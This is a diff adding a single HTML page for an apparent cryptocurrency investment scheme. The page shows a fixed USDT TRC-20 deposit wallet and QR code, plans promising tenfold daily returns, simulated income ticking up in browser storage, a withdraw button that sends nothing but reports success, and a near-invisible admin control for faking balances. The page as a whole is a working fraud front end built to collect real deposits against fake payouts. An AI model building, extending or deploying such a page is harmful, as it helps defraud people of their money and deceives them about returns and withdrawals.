@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Investment Plan</title>
+<style>
+body{margin:0;font-family:Arial;background:#0f172a;color:#e5e7eb}
+header{background:#020617;padding:15px;display:flex;justify-content:space-between;align-items:center}
+button{background:#22c55e;border:none;padding:10px;border-radius:8px;cursor:pointer;margin-top:5px}
+.card{background:#020617;margin:15px;padding:15px;border-radius:10px}
+input{width:100%;padding:8px;margin:5px 0;background:#020617;color:#fff;border:1px solid #333;border-radius:5px}
+.hidden{display:none}
+</style>
+</head>
+<body>
+
+<header>
+  <b>Investment Plan</b>
+  <span id="balance">Balance: 0 USDT</span>
+</header>
+
+<!-- Auth -->
+<div class="card" id="auth">
+  <h3>Create Account</h3>
+  <input id="email" placeholder="Email">
+  <input id="password" type="password" placeholder="Password">
+  <input id="promo" placeholder="Promo code (PASIYA)">
+  <button onclick="register()">Register</button>
+</div>
+
+<!-- Deposit -->
+<div class="card hidden" id="deposit">
+  <h3>Deposit USDT (TRC-20)</h3>
+  <p>Minimum deposit: 50 USDT</p>
+  <p>Wallet Address:</p>
+  <input type="text" value="TLVKwm4u9DQiXgbxwyYn3WBpvvZNGyN8sK" id="wallet" readonly>
+  <button onclick="copyAddress()">Copy Address</button>
+  <br><br>
+  <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TLVKwm4u9DQiXgbxwyYn3WBpvvZNGyN8sK" alt="QR Code">
+  <br><br>
+  <img src="wallet.png" alt="Deposit Screenshot" style="max-width:300px;border:1px solid #ccc;border-radius:10px;">
+</div>
+
+<!-- Withdraw -->
+<div class="card hidden" id="withdraw">
+  <h3>Withdraw USDT (TRC-20)</h3>
+  <p>Minimum withdraw: 2 USDT</p>
+  <input id="withdrawAddress" placeholder="Enter your USDT TRC-20 address">
+  <input id="withdrawAmount" type="number" placeholder="Amount">
+  <button onclick="withdraw()">Withdraw</button>
+</div>
+
+<!-- Investment Plans -->
+<div class="card hidden" id="plans"></div>
+
+<script>
+let user = JSON.parse(localStorage.getItem("user"));
+if(!user){
+  user={balance:1,plans:[null,null,null]};
+  localStorage.setItem("user",JSON.stringify(user));
+  alert("Congratulations! You won 1 USDT");
+}
+
+const plans=[
+  {price:10,income:100,days:30},
+  {price:20,income:200,days:30},
+  {price:50,income:500,days:30}
+];
+
+function register(){
+  if(document.getElementById("promo").value!=="PASIYA"){alert("Invalid promo code"); return;}
+  user.email=document.getElementById("email").value;
+  localStorage.setItem("user",JSON.stringify(user));
+  document.getElementById("auth").classList.add("hidden");
+  showSections();
+}
+
+function showSections(){
+  document.getElementById("balance").innerText="Balance: "+user.balance+" USDT";
+  document.getElementById("deposit").classList.remove("hidden");
+  document.getElementById("withdraw").classList.remove("hidden");
+  renderPlans();
+}
+
+// Deposit copy
+function copyAddress(){
+  const wallet=document.getElementById("wallet");
+  wallet.select();
+  wallet.setSelectionRange(0,99999);
+  navigator.clipboard.writeText(wallet.value);
+  alert("Wallet address copied!");
+}
+
+// Withdraw function
+function withdraw(){
+  let amt=parseFloat(document.getElementById("withdrawAmount").value);
+  if(amt<2){alert("Minimum withdraw 2 USDT"); return;}
+  if(amt>user.balance){alert("Insufficient balance"); return;}
+  user.balance-=amt;
+  localStorage.setItem("user",JSON.stringify(user));
+  alert("Withdraw successful!");
+  showSections();
+}
+
+// Render plans
+function renderPlans(){
+  const box=document.getElementById("plans");
+  box.classList.remove("hidden");
+  box.innerHTML="";
+  plans.forEach((p,i)=>{
+    let active=user.plans[i];
+    box.innerHTML+=`
+      <div class="card">
+        <h4>Investment Plan</h4>
+        <p>Price: ${p.price} USDT</p>
+        <p>1 Day Income: ${p.income} USDT</p>
+        <p>Active Days: ${active?active.days:p.days}</p>
+        <button onclick="buy(${i})">${active?"Active":"Buy Now"}</button>
+      </div>
+    `;
+  });
+}
+
+// Buy plan
+function buy(i){
+  let p=plans[i];
+  if(user.balance<p.price){alert("Insufficient balance"); return;}
+  user.balance-=p.price;
+  user.plans[i]={days:p.days,income:p.income};
+  save();
+}
+
+// Save user
+function save(){
+  localStorage.setItem("user",JSON.stringify(user));
+  showSections();
+}
+
+// Daily income simulation
+setInterval(()=>{
+  user.plans.forEach(plan=>{
+    if(plan && plan.days>0){
+      user.balance+=plan.income;
+      plan.days--;
+    }
+  });
+  save();
+},1000*10); // every 10 seconds for demo, change to 86400000 for real day
+
+// Admin mode
+function admin(){
+  let pass=prompt("Enter admin code");
+  if(pass!=="ADMIN123"){alert("Access denied"); return;}
+  let amt=prompt("New balance for user");
+  user.balance=parseFloat(amt);
+  save();
+}
+</script>
+
+<!-- Hidden admin button -->
+<button onclick="admin()" style="position:fixed;bottom:5px;right:5px;opacity:0.05">.</button>
+
+</body>
+</html>
